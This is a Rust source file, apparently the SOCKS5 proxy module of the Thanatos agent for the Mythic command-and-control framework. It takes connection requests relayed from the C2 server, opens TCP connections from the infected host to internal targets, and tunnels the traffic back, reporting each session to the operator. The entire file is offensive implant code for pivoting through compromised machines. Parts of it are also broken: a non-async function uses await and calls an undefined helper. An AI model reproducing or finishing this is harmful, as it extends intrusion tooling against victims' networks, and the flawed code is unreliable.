// Final SOCKS5 Agent-Side Handler for Mythic in Rust (Integrated for Thanatos)
use base64::{decode, encode};
use serde::Deserialize;
use serde_json::{json, Value};
use std::collections::HashMap;
use std::error::Error;
use std::net::{Ipv4Addr, Ipv6Addr, SocketAddr};
use std::sync::Arc;
use std::sync::mpsc as std_mpsc;
use std::sync::Mutex;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::{mpsc as tokio_mpsc, Mutex as AsyncMutex};
use tokio::time::{timeout, Duration};
use tokio_util::sync::CancellationToken;
use once_cell::sync::Lazy;

#[derive(Deserialize)]
struct AgentTask {
    id: String,
    #[serde(default)]
    command: Option<String>,
    #[serde(default)]
    parameters: Option<String>,
}

// -------- Global state (channels + cancel token) --------

struct SocksIn {
    tx: tokio_mpsc::UnboundedSender<Value>,
    rx: AsyncMutex<tokio_mpsc::UnboundedReceiver<Value>>,
}

static SOCKS_IN: Lazy<SocksIn> = Lazy::new(|| {
    let (tx, rx) = tokio_mpsc::unbounded_channel::<Value>();
    SocksIn { tx, rx: AsyncMutex::new(rx) }
});

// Backward-compatible alias so existing code that uses SOCKS_IN_TX.send(...) still works.
static SOCKS_IN_TX: Lazy<tokio_mpsc::UnboundedSender<Value>> = Lazy::new(|| SOCKS_IN.tx.clone());

static SOCKS_OUT: Lazy<Arc<Mutex<Vec<Value>>>> = Lazy::new(|| Arc::new(Mutex::new(Vec::new())));
static SOCKS_CANCEL: Lazy<CancellationToken> = Lazy::new(CancellationToken::new);

// Optional helper for callers
#[inline]
pub fn socks_in_send(v: Value) -> Result<(), tokio_mpsc::error::SendError<Value>> {
    SOCKS_IN.tx.send(v)
}

/* -------------------------- Debug helpers -------------------------- */

fn debug_to_mythic(task_id: &str, title: impl Into<String>, detail: impl Into<String>) {
    let _ = post_response(
        task_id,
        json!({"user_output": format!("{}: {}", title.into(), detail.into())})
    ).await;
}

fn hex_preview(data: &[u8], max: usize) -> String {
    use std::fmt::Write;
    let mut s = String::new();
    let take = data.len().min(max);
    for b in &data[..take] {
        let _ = write!(&mut s, "{:02x}", b);
    }
    if data.len() > max {
        s.push('…');
    }
    s
}

/* ------------------------------- SOCKS utils ------------------------------ */

fn build_reply(rep: u8, bound: Option<SocketAddr>) -> Vec<u8> {
    let mut out = vec![0x05, rep, 0x00];
    match bound {
        Some(SocketAddr::V4(v4)) => {
            out.push(0x01);
            out.extend_from_slice(&v4.ip().octets());
            out.extend_from_slice(&v4.port().to_be_bytes());
        }
        Some(SocketAddr::V6(v6)) => {
            out.push(0x04);
            out.extend_from_slice(&v6.ip().octets());
            out.extend_from_slice(&v6.port().to_be_bytes());
        }
        None => {
            out.push(0x01);
            out.extend_from_slice(&Ipv4Addr::UNSPECIFIED.octets());
            out.extend_from_slice(&0u16.to_be_bytes());
        }
    }
    out
}

fn send_socks_live(server_id: &str, data: &[u8], exit: bool) -> Result<(), Box<dyn Error>> {
    let sid_json = match server_id.parse::<u64>() {
        Ok(n) => json!(n),
        Err(_) => json!(server_id),
    };
    let item = json!({
        "server_id": sid_json,
        "data": encode(data),
        "exit": exit
    });
    let mut out = SOCKS_OUT.lock().unwrap_or_else(|_| Mutex::new(Vec::new()).lock().unwrap());
    out.push(item);
    Ok(())
}

fn send_exit_live(server_id: &str) {
    let _ = send_socks_live(server_id, &[], true);
}

/* --------------------------- CONNECT frame parsing ------------------------- */

fn parse_connect(decoded: &[u8]) -> Result<(String, u16, u8), Box<dyn Error>> {
    if decoded.len() < 4 { return Err("SOCKS5 request too short".into()); }
    if decoded[0] != 0x05 { return Err("Unsupported SOCKS version".into()); }
    if decoded[1] != 0x01 { return Err("Not CONNECT (CMD!=0x01)".into()); }
    if decoded[2] != 0x00 { return Err("RSV must be 0x00".into()); }

    let atyp = decoded[3];
    match atyp {
        0x01 => {
            if decoded.len() < 10 { return Err("IPv4 CONNECT frame too short".into()); }
            let ip = Ipv4Addr::new(decoded[4], decoded[5], decoded[6], decoded[7]);
            let port = u16::from_be_bytes([decoded[8], decoded[9]]);
            Ok((ip.to_string(), port, atyp))
        }
        0x03 => {
            if decoded.len() < 5 { return Err("DOMAIN CONNECT no length".into()); }
            let len = decoded[4] as usize;
            if len == 0 || len > 255 { return Err("Bad domain length".into()); }
            let need = 5 + len + 2;
            if decoded.len() < need { return Err("DOMAIN CONNECT truncated".into()); }
            let domain = std::str::from_utf8(&decoded[5..5 + len])?.to_string();
            let port = u16::from_be_bytes([decoded[5 + len], decoded[5 + len + 1]]);
            Ok((domain, port, atyp))
        }
        0x04 => {
            if decoded.len() < 22 { return Err("IPv6 CONNECT frame too short".into()); }
            let mut octets = [0u8; 16];
            octets.copy_from_slice(&decoded[4..20]);
            let ip = Ipv6Addr::from(octets);
            let port = u16::from_be_bytes([decoded[20], decoded[21]]);
            Ok((ip.to_string(), port, atyp))
        }
        _ => Err("Unsupported ATYP in CONNECT".into()),
    }
}

/* ------------------------- Helpers for inbound frames ---------------------- */

fn as_string_or_number(v: &Value) -> Option<String> {
    if let Some(s) = v.as_str() { return Some(s.to_string()); }
    if let Some(n) = v.as_u64() { return Some(n.to_string()); }
    if let Some(n) = v.as_i64() { return Some(n.to_string()); }
    None
}

fn normalize_socks_item(v: &Value) -> Option<Value> {
    let sid = v.get("server_id").and_then(as_string_or_number)?;
    let data = v.get("data")
        .or_else(|| v.get("chunk_data"))
        .and_then(|x| x.as_str())
        .unwrap_or("")
        .to_string();
    let exit = v.get("exit")
        .or_else(|| v.get("close"))
        .and_then(|x| x.as_bool())
        .unwrap_or(false);

    Some(json!({ "server_id": sid, "data": data, "exit": exit }))
}

/* ------------------------ Greeting detection (optional) -------------------- */

fn looks_like_greeting(buf: &[u8]) -> bool {
    if buf.len() < 2 { return false; }
    if buf[0] != 0x05 { return false; }
    let n = buf[1] as usize;
    buf.len() >= 2 + n && buf.len() < 2 + n + 4
}

/* ------------------------------ Session logic ----------------------------- */

async fn run_session(
    parent_task_id: String,
    server_id: String,
    mut sess_rx: tokio_mpsc::UnboundedReceiver<Value>,
) -> Result<(), Box<dyn Error>> {
    debug_to_mythic(&parent_task_id, "socks.session.start", format!("sid={}", server_id));

    // Get first frame
    let first = match sess_rx.recv().await {
        Some(v) => v,
        None => {
            debug_to_mythic(&parent_task_id, "socks.session.abort", "no-initial-packet");
            return Ok(());
        }
    };

    let b64 = first["data"].as_str().unwrap_or("");
    let mut buf = match decode(b64) {
        Ok(d) => d,
        Err(e) => {
            debug_to_mythic(&parent_task_id, "socks.decode.fail", format!("err={}", e));
            send_socks_live(&server_id, &build_reply(0x01, None), true)?;
            return Ok(());
        }
    };

    debug_to_mythic(&parent_task_id, "socks.first", format!("len={}; hex={}", buf.len(), hex_preview(&buf, 64)));

    // Handle optional greeting
    if looks_like_greeting(&buf) {
        let sel = [0x05u8, 0x00u8]; // VER=5, METHOD=0 (no auth)
        send_socks_live(&server_id, &sel, false)?;
        debug_to_mythic(&parent_task_id, "socks.greeting.seen", "replied 05 00");

        // Wait for CONNECT
        let nxt = match sess_rx.recv().await {
            Some(v) => v,
            None => {
                debug_to_mythic(&parent_task_id, "socks.session.abort", "no CONNECT after greeting");
                return Ok(());
            }
        };
        let b64 = nxt["data"].as_str().unwrap_or("");
        buf = match decode(b64) {
            Ok(d) => d,
            Err(e) => {
                debug_to_mythic(&parent_task_id, "socks.decode.fail2", format!("err={}", e));
                send_socks_live(&server_id, &build_reply(0x01, None), true)?;
                return Ok(());
            }
        };
        debug_to_mythic(&parent_task_id, "socks.connect.req.after_greet", format!("len={}; hex={}", buf.len(), hex_preview(&buf, 64)));
    }

    // Parse CONNECT
    let (addr, port, _atyp) = match parse_connect(&buf) {
        Ok(v) => v,
        Err(e) => {
            let rep = if e.to_string().contains("ATYP") { 0x08 } else { 0x07 };
            debug_to_mythic(&parent_task_id, "socks.connect.parse_err", format!("err={}", e));
            send_socks_live(&server_id, &build_reply(rep, None), true)?;
            return Ok(());
        }
    };

    debug_to_mythic(&parent_task_id, "socks.connect.try", format!("target={}:{}", addr, port));

    // Connect to destination
    let remote = match timeout(Duration::from_secs(15), TcpStream::connect((addr.as_str(), port))).await {
        Ok(Ok(s)) => s,
        Ok(Err(e)) => {
            let rep = if e.to_string().to_lowercase().contains("refused") { 0x05 }
                      else if e.to_string().to_lowercase().contains("unreachable") { 0x03 }
                      else if e.to_string().to_lowercase().contains("unsupported") { 0x08 }
                      else { 0x01 };
            debug_to_mythic(&parent_task_id, "socks.connect.err", format!("rep=0x{:02x}; err={}", rep, e));
            send_socks_live(&server_id, &build_reply(rep, None), true)?;
            return Ok(());
        }
        Err(_) => {
            debug_to_mythic(&parent_task_id, "socks.connect.timeout", "15s exceeded");
            send_socks_live(&server_id, &build_reply(0x01, None), true)?;
            return Ok(());
        }
    };

    let local_addr = remote.local_addr().ok();
    let ok_reply = build_reply(0x00, local_addr);
    send_socks_live(&server_id, &ok_reply, false)?;
    debug_to_mythic(&parent_task_id, "socks.connect.ok", format!("bound={:?}; reply_hex={}", local_addr, hex_preview(&ok_reply, 22)));

    let (mut r_r, mut r_w) = remote.into_split();

    // A2M: Agent to Mythic (remote read -> send to mythic)
    let sid_up = server_id.clone();
    let parent_up = parent_task_id.clone();
    let a2m = tokio::spawn(async move {
        let mut buf = vec![0u8; 16 * 1024];
        let mut total: u64 = 0;
        loop {
            let result = timeout(Duration::from_secs(300), r_r.read(&mut buf)).await;
            match result {
                Ok(Ok(0)) => {
                    debug_to_mythic(&parent_up, "socks.a2m.eof", format!("total={}", total));
                    send_exit_live(&sid_up);
                    break;
                }
                Ok(Ok(n)) => {
                    if n > 0 {
                        total += n as u64;
                        let _ = send_socks_live(&sid_up, &buf[..n], false);
                        if total % (64 * 1024) == 0 {
                            debug_to_mythic(&parent_up, "socks.a2m.progress", format!("sent_up={}", total));
                        }
                    }
                }
                Ok(Err(e)) => {
                    debug_to_mythic(&parent_up, "socks.a2m.read_err", format!("err={}", e));
                    send_exit_live(&sid_up);
                    break;
                }
                Err(_) => {
                    debug_to_mythic(&parent_up, "socks.a2m.idle_timeout", format!("sent_up={}", total));
                    send_exit_live(&sid_up);
                    break;
                }
            }
        }
    });

    // M2A: Mythic to Agent (recv from mythic -> write to remote)
    let _sid_dn = server_id.clone(); // Prefix with _ to suppress unused warning
    let parent_dn = parent_task_id.clone();
    let m2a = tokio::spawn(async move {
        let mut total: u64 = 0;
        while let Some(pkt) = sess_rx.recv().await {
            let exit = pkt.get("exit").and_then(|v| v.as_bool()).unwrap_or(false);
            if exit {
                debug_to_mythic(&parent_dn, "socks.m2a.exit", format!("total_written={}", total));
                let _ = r_w.shutdown().await;
                break;
            }
            let data_b64 = pkt.get("data").and_then(|v| v.as_str()).unwrap_or("");
            let bytes = match decode(data_b64) {
                Ok(b) => b,
                Err(e) => {
                    debug_to_mythic(&parent_dn, "socks.m2a.b64_err", format!("err={}", e));
                    continue;
                }
            };
            if !bytes.is_empty() {
                total += bytes.len() as u64;
                let write_result = timeout(Duration::from_secs(60), r_w.write_all(&bytes)).await;
                if let Err(e) = write_result {
                    debug_to_mythic(&parent_dn, "socks.m2a.write_err", format!("err={}", e));
                    break;
                }
                if total % (64 * 1024) == 0 {
                    debug_to_mythic(&parent_dn, "socks.m2a.progress", format!("wrote_down={}", total));
                }
            }
        }
        let _ = r_w.shutdown().await;
    });

    let _ = a2m.await;
    let _ = m2a.await;

    debug_to_mythic(&parent_task_id, "socks.session.end", format!("sid={}", server_id));
    Ok(())
}

/* --------------------------------- Dispatcher ----------------------------- */

pub fn start_socks_dispatcher(task_id: String) {
    let rt = tokio::runtime::Runtime::new().unwrap();
    rt.block_on(async {
        let mut sessions: HashMap<String, tokio_mpsc::UnboundedSender<Value>> = HashMap::new();
        let mut seen: u64 = 0;

        debug_to_mythic(&task_id, "socks.dispatcher.run", "awaiting items");

        // This task owns the receiver while it runs.
        let mut rx_guard = SOCKS_IN.rx.lock().await;

        loop {
            tokio::select! {
                maybe = rx_guard.recv() => {
                    let Some(item) = maybe else {
                        debug_to_mythic(&task_id, "socks.dispatcher.rx_closed", "channel closed");
                        break;
                    };

                    seen += 1;
                    let sid = item["server_id"].as_str().unwrap_or("").to_string();
                    let exit = item["exit"].as_bool().unwrap_or(false);
                    let data_len_b64 = item["data"].as_str().map(|s| s.len()).unwrap_or(0);

                    if seen <= 5 || seen % 100 == 0 {
                        debug_to_mythic(&task_id, "socks.dispatcher.item", format!("count={}; sid={}; exit={}; data_b64_len={}", seen, sid, exit, data_len_b64));
                    }

                    let entry = sessions.entry(sid.clone()).or_insert_with(|| {
                        let (sess_tx, sess_rx) = tokio_mpsc::unbounded_channel::<Value>();
                        let task_clone = task_id.clone();
                        let sid_clone = sid.clone();
                        tokio::spawn(async move {
                            let _ = run_session(task_clone, sid_clone, sess_rx).await;
                        });
                        sess_tx
                    });

                    if entry.send(item).is_err() {
                        sessions.remove(&sid);
                        debug_to_mythic(&task_id, "socks.dispatcher.drop_dead", format!("sid={}", sid));
                    }

                    if exit {
                        sessions.remove(&sid);
                        debug_to_mythic(&task_id, "socks.dispatcher.exit", format!("sid={}", sid));
                    }
                }
                _ = SOCKS_CANCEL.cancelled() => {
                    debug_to_mythic(&task_id, "socks.dispatcher.cancelled", "Shutting down");
                    break;
                }
            }
        }

        debug_to_mythic(&task_id, "socks.dispatcher.end", "bridge closed");
        sessions.clear();
    });
}

/* --------------------------------- Entry ---------------------------------- */

pub fn handle_socks(
    rx: std_mpsc::Receiver<Value>,
) -> Result<(), Box<dyn Error>> {
    // First message should be the AgentTask envelope (blocking)
    let task_val = rx.recv()?;
    let task: AgentTask = serde_json::from_value(task_val)?;

    // Parse parameters (JSON string)
    let params: Value = if let Some(p) = task.parameters {
        serde_json::from_str(&p)?
    } else {
        return Err("No parameters in task".into());
    };
    let action = params.get("action").and_then(|v| v.as_str()).unwrap_or("start");

    debug_to_mythic(&task.id, "socks.handler", format!("action={}", action));

    if action == "stop" {
        SOCKS_CANCEL.cancel();
        debug_to_mythic(&task.id, "socks.handler.stop", "Dispatcher cancelled");
        return Ok(());
    }

    // Start the dispatcher for "start"
    start_socks_dispatcher(task.id);

    Ok(())
}

pub fn setup_socks(
    _tx: &std_mpsc::Sender<Value>,
    rx: std_mpsc::Receiver<Value>,
) -> Result<(), Box<dyn Error>> {
    handle_socks(rx)
}
